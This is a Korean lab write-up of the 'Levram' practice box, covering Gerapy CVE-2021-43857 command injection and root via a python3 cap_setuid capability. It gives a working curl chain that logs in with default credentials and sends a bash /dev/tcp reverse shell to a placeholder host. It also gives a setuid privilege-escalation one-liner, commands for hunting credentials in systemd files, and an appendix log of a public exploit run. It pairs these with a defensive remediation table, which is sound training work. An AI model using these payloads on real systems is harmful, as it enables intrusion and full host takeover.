> 사용한 도구는 `nmap`·`curl`·`nc`·`tmux`·`rlwrap`·`md5sum`·`linpeas.sh`·`tar`, 그리고 공개 익스플로잇 스크립트(EDB 50640)다. 전부 허용 범위다.
> 공개 PoC/익스플로잇 스크립트는 금지가 아니다. 금지되는 것은 **취약점 탐지와 익스플로잇을 자동으로 묶어주는 프레임워크**다.
> `linpeas.sh` 는 열거 전용이라 허용된다 — 익스플로잇 단계가 없다. 이전 판본은 이 목록에서 linpeas 를 통째로 빼고 프론트매터의 `tech/enum/peas` 태그까지 지웠는데, 실제로 privesc를 짚어준 것이 그것이었다(4-3). 규정 문제가 아니라 기록 문제다.
> (`ssh` 는 목록에서 뺐다 — 이 박스에서 타겟에 SSH로 붙은 기록이 없다. 4-4 참조)

| 금지되는 것 | 이 박스에서 대체한 방법 (= 시험 자산) |
|---|---|
| Metasploit (시험 전체에서 1대 한정) · `msf` auxiliary/exploit 모듈 | `curl` 한 줄 명령주입. Gerapy용 msf 모듈이 있더라도 `curl` 이 더 빠르다 |
| sqlmap | 이 박스에는 SQLi가 없다 — 해당 없음 |
| 자동 취약점 스캐너 (Nessus·OpenVAS·Nexpose·Canvas·Core Impact·SAINT) | 배너 → 버전 판정 → CVE 수동 대조 |
| 탐지와 익스플로잇을 자동으로 묶는 프레임워크 (`nuclei` 의 자동 익스플로잇 템플릿 등) | 404 URLconf 덤프 → 수동 엔드포인트 식별 |
| `msfvenom` / `nc` / 직접 작성 스크립트 | 허용. 마음껏 쓴다 |
| AutoRecon · linpeas · LinEnum · pspy | 금지 아님 — 허용. 열거 전용이라 익스플로잇 단계가 없다. 과잉 금지 판정은 안전한 쪽으로 틀리는 것이 아니라 쓸 수 있는 도구를 못 쓰게 만든다([[_WRITEUP-STANDARD]]) |

전 과정 수동 재현(시험용 최소 명령 3개) — 스크립트 없이 이것만으로 끝난다:

```bash
# ① 토큰 (값은 매번 달라지므로 변수로 받는다)
TOK=$(curl -s -X POST http://TARGET:8000/api/user/auth -H 'Content-Type: application/json' \
     -d '{"username":"admin","password":"admin"}' \
     | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
# ② 리스너
rlwrap nc -lvnp 4444
# ③ 주입 — 프로젝트가 없어도 성립한다. 경로의 이름은 아무거나 좋다
curl -s -X POST http://TARGET:8000/api/project/pwn/parse \
     -H "Authorization: Token $TOK" -H 'Content-Type: application/json' \
     -d '{"spider":"`/bin/bash -c '"'"'bash -i >& /dev/tcp/KALI/4444 0>&1'"'"'`"}'
```

> [!note] 이전 판본은 여기에 "② 프로젝트 생성 (선행조건)"을 넣어 4개로 적어뒀다
> 취약 코드에 존재 검사가 없으므로(2-6) 불필요한 단계다. 다만 EDB 50640 을 쓸 생각이라면 그때는 필요하니 병기한다:
> ```bash
> curl -s -X POST http://TARGET:8000/api/project/create \
>      -H "Authorization: Token $TOK" -H 'Content-Type: application/json' \
>      -d '{"name":"pwn","description":"pwn"}'
> ```
> **불필요한 단계를 "선행조건"으로 적어두면 그 단계가 막혔을 때 박스를 통째로 포기하게 된다.** 시험에서 진짜 위험은 이쪽이다.

### 7-2. 일반화된 교훈

1. 버전 판정의 목표는 "정확한 버전"이 아니라 "패치 경계의 어느 쪽인가"다. 여기서는 런타임 동작 차이 하나(URLconf 덤프의 트레일링 슬래시)로 후보가 `{0.9.5, 0.9.6, 0.9.7}` 로 좁혀졌고 셋 다 취약이라 거기서 끝났다. 근거를 더 쌓아야 하는 것은 후보 집합이 패치 경계를 걸칠 때뿐이다.
   근거가 여러 개 필요할 때의 규율은 [[Hub]]에서 나온 그대로다 — 거기서는 근거 3개가 전부 "2019년 배포본 잔존물"이라는 같은 출처여서 틀렸다. **개수가 아니라 독립성**이 관건이다.
   실제로는 두 번째 축(webpack 자산 30개 ↔ 정품 wheel)도 확보했고 0.9.7로 확정됐다. 다만 그건 판정에 필요한 작업이 아니었고 이 박스에서 가장 오래 걸린 구간이 그것이다(6장 ⑧). "근거를 더 쌓아야 하나"의 답은 "후보 집합이 패치 경계를 걸치는가"로 결정한다. 걸치지 않으면 멈춘다.
   그리고 이 노트가 비싸게 배운 규율 하나 — 한 대조는 재현 절차와 함께 적는다. 증거 B는 결론만 적혀 있었던 탓에 적대적 검증에서 "날조"로 판정돼 통째로 삭제됐다가 `~/.cache/pip` 에 남은 wheel 로 복원됐다. 재현 경로가 없는 관측은 자기 자신을 방어하지 못한다.
2. `WSGIServer` 배너는 Django 개발 서버이고 `DEBUG=True` 를 의심할 자리다. 아무 경로나 때려서 스택트레이스나 URLconf가 나오면 디렉터리 열거를 건너뛴다. 여기서는 404 하나로 `^api/project/(\S+)/parse` 라는 주입 지점을 그대로 얻었다.
3. "인증 후 RCE" CVE를 봤으면 기본 자격증명부터 시도한다. 인증 요구는 CVSS를 낮추지만 현실에서는 장벽이 아니다. `admin:admin` 이 `parse` 로 가는 문을 열었다.
   덧붙여, "나머지는 전부 401이더라"는 응답을 세어서 내릴 결론이 아니다. 오픈소스 제품이면 `grep -n 'permission_classes' views.py` 한 줄이 전수 조사이고, 이 박스에서는 그렇게 하자 주석 처리된 데코레이터 2개(`index`·`project_upload`)가 나왔다. 이전 판본은 확인 없이 "비인증은 `/api/user/auth` 하나뿐"이라고 단정했다.
4. 공개 익스플로잇이 죽으면 스크립트를 읽되, 스크립트의 한계를 취약점의 한계로 옮겨 적지 않는다. EDB 50640은 목록의 `[0]` 을 읽어서 깨끗한 박스에서 `IndexError` 로 터진다. 예외가 로컬 트레이스백이면 타겟은 무죄다.
   이 노트가 여기서 한 번 미끄러졌다 — 스크립트가 프로젝트를 필요로 한다는 사실을 "취약점의 선행조건"으로 승격시켰고, 취약 코드에는 그런 검사가 없다(2-6). 판별법은 한 줄이다: 그 전제조건을 취약 코드 원문에서 찾을 수 있는가?
5. 명령주입 페이로드는 `` `/bin/bash -c '...'` `` 로 감싼다. `shell=True` 는 `/bin/sh`(Ubuntu에서는 dash)를 쓰고, dash에는 `/dev/tcp` 도 `>&` 도 없다. 이 한 겹을 빼먹으면 에러도 없이 조용히 실패한다.
6. 주입 지점이 명령의 *중간* 인자 위치면 `;` 보다 백틱/`$()` 다. 뒤에 남은 인자들이 문법을 깨뜨리지 않기 때문이고, `;` 이 안 통했다고 포기하지 않는다.
   단 이 박스가 그 사례는 아니다 — `spider_name` 은 `'gerapy parse … {spider_name}'` 의 맨 끝 토큰이라 `;`·`&&` 도 통한다. 백틱을 쓴 것은 EDB 50640 이 그렇게 생겨서다. 일반론의 근거를 이 박스에서 찾으려다 명령 문자열의 모양을 지어내면 안 된다(2-3).
7. capability 열거는 리눅스 privesc 반사 동작이다. `linpeas` 를 올릴 수 있으면 그게 가장 빠르고(이 박스가 그랬다), 못 올리면 `getcap -r / 2>/dev/null` 을 직접 친다. `ping` 의 `cap_net_raw` 같은 정상 항목이 섞여 나오므로 비정상만 골라내는 눈이 필요하다 — 인터프리터(`python`, `perl`, `ruby`)나 `tar`·`gdb` 에 붙은 capability가 그것이다. 판별 규칙은 `cap_net_*` 는 노이즈, 그 외는 후보, 대상이 인터프리터면 무조건 후보.
   그리고 `getcap` 이 미설치면 `find / -exec getcap {} \;` 도 실패한다 — 없는 명령을 반복 호출하는 것뿐이다(6장 ⑦).
8. capability는 정확히 부여된 것만 쓸 수 있다. `cap_setuid` 만 있으면 `os.setgid(0)` 은 `EPERM` 이다. GTFOBins 원문을 임의로 "보강"하지 말 것.
9. `/etc/systemd/system/` 은 크리덴셜 창고다. world-readable이 기본이고 관리자가 주석에 비밀번호를 적어두는 일이 흔하다. `cat /etc/systemd/system/*.service`, `systemctl cat <서비스>`, `grep -rIn -iE 'pass|secret|token' /etc/systemd/` 를 열거 체크리스트에 넣는다. 유닛 파일에서는 `User=`(비면 root)·`ExecStart=`(쓰기 가능한 스크립트)·주석 순으로 읽는다.
10. 권한상승 경로가 둘이면 둘 다 확인하되 선택은 재접속 비용으로 한다. capability 경로는 `gid=1000(app)` 이 남는 반쪽 root였고, 비밀번호 경로는 `uid=0 gid=0 groups=0` 의 완전한 root를 줬다. 시험에서는 안정적인 발판이 되는 쪽을 택한다.
    단 "비밀번호를 얻었다"는 "재접속 채널을 얻었다"가 아니다. 이 박스는 SSH를 시도조차 하지 않고 "SSH 재접속 확보"라고 적었다. Ubuntu 22.04 sshd 기본값은 `PermitRootLogin prohibit-password` 라 오히려 안 되는 쪽이 기본값이다. 확인은 두 줄이다 — `grep -i permitrootlogin /etc/ssh/sshd_config` 와 실제 `ssh root@TARGET`.
11. `su` 의 비밀번호 에코 여부는 pty 유무로 갈린다. "항상 안 찍힌다"는 거짓이다. pty가 있으면 `tcsetattr` 로 에코를 끄므로 `Password:` 뒤에 아무것도 안 찍히고 그게 정상이니, 화면이 조용하다고 입력이 안 먹은 것으로 오판하지 않는다. pty가 없으면 끌 터미널이 원격에 없어 내 쪽 로컬 터미널이 에코하고 비밀번호가 트랜스크립트에 그대로 남는다 — 보고서 제출 전에 지운다.
    그리고 "`su` 는 TTY를 요구한다"도 거짓이다 — TTY 없이도 stdin 에서 읽어 인증되는 환경이 실측됐다([[plum]]). `must be run from a terminal` 은 날 수도 있는 에러이지 규칙이 아니다. 그래도 pty는 먼저 잡는 편이 낫다(비밀번호 노출·에디터·`less` 문제). 자동화한다면 `tmux send-keys -l` 로 밀어 넣는다(4-4).
12. **"내가 찾아본 곳에 없다"는 "존재하지 않는다"가 아니다.** 이 노트의 증거 B가 그 오류로 통째로 삭제됐다 — 검증자가 `~/PG/` 와 `/tmp/gv/` 두 디렉터리만 보고 "wheel 을 받은 적이 없다 → 대조한 적이 없다 → 날조다"로 세 단계를 뛰었고, wheel 은 `~/.cache/pip/http-v2/` 에 `.body` 로 멀쩡히 있었다.
    "실행한 적 없다"를 판정하기 전에 훑을 곳은 패키지 매니저 캐시(`~/.cache/pip`·`~/.npm`·`~/.gem`·`~/.cargo`·`/var/cache/apt`), 브라우저·`curl` 캐시, 삭제됐어도 남는 셸 히스토리(`~/.bash_history`·`~/.zsh_history`), `~/.local/share`, tmux 스크롤백, 그리고 파일 mtime이다.
    검증자에게만 해당하는 규율이 아니다 — 침투 중 "이 시스템에 X는 없다"고 단정하는 것도 같은 오류다. 캐시와 히스토리는 항상 뒤진다.

### 7-3. 시간 배분 요약

- 총 예산 감각: Fundamental 난이도 박스는 60~90분이 적정선이고, 이 박스의 실측은 8분이었다(6장 ⑧의 mtime 타임라인). 예산을 초과시킬 위험이 있었던 유일한 지점은 EDB 50640 디버깅인데 4분 만에 접고 수동 `curl` 로 갈아탄 것이 주효했다.
- 손절 규칙 3개
  1. 기본 자격증명은 5개 시도, 1분 — 안 되면 다른 벡터로
  2. 공개 익스플로잇 디버깅은 10분 — 넘기면 `curl` 수동 재구성. 이 박스는 4분에 끊었다
  3. 버전 판정은 패치 경계 판별까지만 — 정밀 대조는 익스플로잇이 실패한 뒤에. 이 박스는 이 규칙을 어겼다(증거 A로 끝났는데 증거 B까지 갔다). 8분에 끝나서 손해가 안 보였을 뿐이다
- 셸을 잡은 뒤 privesc는 linpeas 한 방 또는 열거 6줄 안에 끝난다. **여기서 30분을 쓰고 있다면 열거를 안 한 것이다.**

---

## 8. 방어 관점

| 결함 | 위치 | 조치 |
|---|---|---|
| 운영 환경에 개발 서버 | `manage.py runserver` (`WSGIServer 0.2` 배너) | gunicorn/uWSGI + nginx 뒤로. 개발 서버는 단일 스레드라 보안 이전에 가용성 문제다 |
| `DEBUG = True` | Django `settings.py` | `DEBUG = False` + `ALLOWED_HOSTS` 명시 + 커스텀 `handler404`/`handler500`. 이 하나만 고쳤어도 공격자가 `parse` 엔드포인트를 못 찾았을 가능성이 높다 |
| 기본 자격증명 `admin:admin` | Gerapy 사용자 DB | 최초 기동 시 강제 변경. 기본 계정 유지 시 부팅 거부 |
| 명령주입 (CVE-2021-43857) | `spider` → `shell=True` | 0.9.8 이상으로 업그레이드. 근본 대책은 `shell=False` + 리스트 인자 + 스파이더 이름 화이트리스트 |
| 인증 API에 레이트리밋 없음 | `/api/user/auth` | DRF `throttling` 적용. 기본 자격증명이 아니어도 브루트포스가 열려 있었다 |
| 권한 데코레이터가 주석 처리됨 | `views.py:33`(`index`) · `views.py:303`(`project_upload`) | 주석을 풀어 `@permission_classes([IsAuthenticated])` 를 복원. 업로드 엔드포인트가 비인증으로 열려 있는 것은 그 자체로 임의 파일 쓰기 후보다. 코드 리뷰에서 `# @permission_classes` 를 grep하는 것이 반사여야 한다 |
| 인터프리터에 `cap_setuid` | `/usr/bin/python3.10` | `setcap -r /usr/bin/python3.10`. 특정 권한이 필요하면 전용 헬퍼 바이너리에만 최소 capability를 부여한다. 인터프리터에 붙이면 임의 코드 실행 권한을 준 것과 같다 |
| 유닛 파일 주석에 평문 root 비밀번호 | `/etc/systemd/system/app.service` | 즉시 비밀번호 회전 + 주석 삭제. 자격증명은 `EnvironmentFile=`(0600, root 전용) 또는 `systemd-creds`/시크릿 매니저로 |
| 유닛 파일 권한 | 동일 | 자격증명을 담는 파일은 `chmod 600`. 기본 0644는 모든 로컬 사용자가 읽는다 |
| root SSH 비밀번호 로그인 `[가정 — 이 박스에서 확인하지 않았다]` | `/etc/ssh/sshd_config` | Ubuntu 22.04 기본값은 이미 `PermitRootLogin prohibit-password` 다. 기본값을 완화해 두지 않았는지를 점검한다. 비밀번호가 유출돼도 원격 재진입을 막는 마지막 방어선이다 |
| 서비스 격리 부족 | `app.service` | `ProtectSystem=strict`·`PrivateTmp=yes`·`NoNewPrivileges=yes`. **`NoNewPrivileges=yes` 하나로 capability 권한상승(경로 A)이 차단된다** |
| 아웃바운드 무제한 | 네트워크 | egress 필터링. 리버스셸이 4444로 그대로 나갔다 |

---

## 9. 참고 자료

- CVE-2021-43857 — Gerapy < 0.9.8 인증 후 원격 명령 실행 (`/api/project/<name>/parse` 의 `spider`)
  - https://nvd.nist.gov/vuln/detail/CVE-2021-43857
  - GitHub Advisory: `GHSA-cpwx-vrp4-4pq7`
- Exploit-DB 50640 — Gerapy 0.9.7 RCE PoC. 프로젝트가 최소 1개 존재해야 동작 (`searchsploit -m 50640`)
- GTFOBins — Capabilities / `python`: https://gtfobins.github.io/gtfobins/python/#capabilities
- `capabilities(7)` — 전체 capability 목록과 `permitted`/`effective`/`inheritable` 규칙: `man 7 capabilities`
- `setcap(8)` / `getcap(8)` — 부여·조회. `=ep` 표기의 의미
- Django — `DEBUG` 설정과 `technical_404_response`: https://docs.djangoproject.com/en/4.2/ref/settings/#debug
- Django `APPEND_SLASH` — 트레일링 슬래시 리다이렉트가 판별자를 가리는 이유: https://docs.djangoproject.com/en/4.2/ref/settings/#append-slash
- Django REST Framework — `TokenAuthentication` (`Authorization: Token <키>`): https://www.django-rest-framework.org/api-guide/authentication/#tokenauthentication
- Python `subprocess` — Security Considerations (`shell=True` 경고): https://docs.python.org/3/library/subprocess.html#security-considerations
- systemd `NoNewPrivileges=` — capability 기반 권한상승 차단: `man 5 systemd.exec`
- PyPI Gerapy 릴리스 목록 (버전 대조용 sdist/wheel): https://pypi.org/project/gerapy/#history

## 남긴 흔적 (랩 정리용)

Gerapy에 프로젝트 `pwn` 생성됨(서버에 `PROJECTS_FOLDER/pwn` 디렉터리도 함께 생성). 지우려면 `POST /api/project/pwn/remove`. 랩 Stop/Revert 시 소멸.
`[가정]` `/root/email3.txt`(8바이트)가 있었다고 기록돼 있으나 **디렉터리 목록 산출물이 남아 있지 않다.** 열지 않았다(6장 ⑥).

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[Hub]] — 버전 판정을 같은 출처 근거 3개로 하다 틀린 사례. 이 박스의 방법론이 나온 배경이고, "출제자가 표식을 조작한다"는 교훈의 실제 근거지 — 이 노트가 한때 자기 사례인 것처럼 적었던 것
- [[RubyDome]] · [[Astronaut]] — 같은 "버전 판정은 독립 근거 2개" 패턴. [[RubyDome]]은 같은 날 같은 적대적 검증을 받은 짝 노트다(소스 인용은 정확, 터미널 출력은 날조). 단 Levram 에서는 그 패턴이 그대로 성립하지 않는다 — "실행했어야 하는 것"으로 분류돼 삭제된 증거 B가 실제로는 수행된 작업이었다. 같은 배치에서 나온 판정이라도 개별로 재확인해야 한다는 뜻이고, [[RubyDome]] 쪽 판정도 같은 기준으로 재검증할 가치가 있다 `[가정 — 아직 재검증하지 않았다]`
- [[plum]] — `su` 가 TTY 없이도 동작한다는 실측이 나온 박스. 이 노트 4-4 의 `su` 서술이 그 결과로 정정됐다
- [[Hawat]] — 인용 중첩을 hex 리터럴로 회피 · `python3` 없는 환경의 TTY 업그레이드 · 서비스가 root로 구동되는 패턴
- [[Exfiltrated]] — 인용 중첩을 base64로 회피
- [[01. Pentest Foundations]] — Levram 항목
- [[Crane]] · [[Hub]] — 같은 컬렉션 앞 박스

---

## 부록 A — 이전 세션 기록 (2026-06-26, 다른 랩 인스턴스)


> [!note] 이 절은 원본 노트의 보존본이다 — 본문과 다른 랩 인스턴스다
> 이 박스를 2026-06-26에 한 번 풀었던 기록이다. 타겟 IP가 본문(`192.168.248.24`)과 다르다 — 이 절의 nmap은 `192.168.161.24`, 리버스셸 로그는 `192.168.132.24` 로 또 다르다(같은 날 랩이 재기동된 것으로 보인다).
> 프론트매터의 `ip:` 가 한때 `192.168.161.24` 로 잘못 박혀 있었다 — 색인 스크립트가 부록의 IP를 본문 값으로 집어간 것이다. 지금은 `192.168.248.24` 로 정정했다.
> 플래그 값도 본문과 다르다(`local.txt` `6fb5bd58…` / `proof.txt` `ed363800…`). 인스턴스마다 재생성되기 때문이고, 5장의 값이 최신 세션의 것이다.
> 랩이 재기동되면 IP·타임스탬프·업로드 경로가 바뀌므로 본문(최신 세션)과 값이 다르다.
> 같은 박스를 다른 시점에 두 번 푼 기록이라 대조 자료로 가치가 있다 — 랩 인스턴스마다 무엇이 바뀌고 무엇이 그대로인지 확인할 수 있다.

## Nmap

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ nnmap 192.168.161.24
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-26 14:13 +0900
Nmap scan report for 192.168.161.24
Host is up (0.067s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
8000/tcp open  http    WSGIServer 0.2 (Python 3.10.6)
|_http-server-header: WSGIServer/0.2 CPython/3.10.6
|_http-title: Gerapy
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   65.47 ms 192.168.45.1
2   65.43 ms 192.168.45.254
3   65.53 ms 192.168.251.1
4   65.62 ms 192.168.161.24

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.11 seconds
```

8000 포트 접근 후 로그인 시도`admin/admin`
![[Pasted image 20260626142047.png]]

로그인 성공 후 gerapy v0.9.7 확인
![[Pasted image 20260629092125.png]]

CVE 검색
![[Pasted image 20260629092156.png]]

RCE 취약점 발견 

![[Pasted image 20260629092221.png]]

payload 검색
![[Pasted image 20260629092234.png]]


payload 다운로드
```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ git clone https://github.com/LongWayHomie/CVE-2021-43857.git
Cloning into 'CVE-2021-43857'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 10 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (10/10), 124.07 KiB | 20.68 MiB/s, done.
Resolving deltas: 100% (1/1), done.
```
![[Pasted image 20260629092306.png]]


payload 실행 후 `app` 계정 접근
```bash
┌──(kali㉿kali)-[~/PG/Levram/CVE-2021-43857]
└─$ python cve-2021-43857.py -t 192.168.132.24 -p 8000 -L 192.168.45.156 -P 4444
  ______     _______     ____   ___ ____  _       _  _  _____  ___ ____ _____
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |     | || ||___ / ( _ ) ___|___  |
| |    \ \ / /|  _| _____ __) | | | |__) | |_____| || |_ |_ \ / _ \___ \  / /
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____|__   _|__) | (_) |__) |/ /
 \____|  \_/  |_____|   |_____|\___/_____|_|        |_||____/ \___/____//_/


Exploit for CVE-2021-43857
For: Gerapy < 0.9.8
[*] Resolving URL...
[*] Logging in to application...
[*] Login successful! Proceeding...
[*] Getting the project list
[*] Found project: 4leaf
[*] Getting the ID of the project to build the URL
[*] Found ID of the project:  1
[*] Setting up a netcat listener
listening on [any] 4444 ...
[*] Executing reverse shell payload
[*] Watchout for shell! :)
connect to [192.168.45.156] from (UNKNOWN) [192.168.132.24] 53596
bash: cannot set terminal process group (846): Inappropriate ioctl for device
bash: no job control in this shell
app@ubuntu:~/gerapy$ whoami
whoami
app
app@ubuntu:~/gerapy$
```

local.txt 획득
```bash
app@ubuntu:~$ cat local.txt
cat local.txt
6fb5bd58ccdadc78eb9299e4a6dccc25
app@ubuntu:~$ ifconfig
ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.132.24  netmask 255.255.255.0  broadcast 192.168.132.255
        ether 00:50:56:ab:d2:c7  txqueuelen 1000  (Ethernet)
        RX packets 1541  bytes 153139 (153.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1282  bytes 3613201 (3.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 392  bytes 31600 (31.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 392  bytes 31600 (31.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

![[Pasted image 20260629092633.png]]


linpeas.sh 실행하여 python 취약점 발견
![[Pasted image 20260629102405.png]]


root 획득 후 flag 확인

```bash
app@ubuntu:~/gerapy$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
<c 'import os; os.setuid(0); os.system("/bin/bash")'
root@ubuntu:~/gerapy# whoami
whoami
root
root@ubuntu:~/gerapy# cat /root/proof.txt
cat /root/proof.txt
ed363800340058da6500e35c1150c446
```
![[Pasted image 20260629102311.png]]
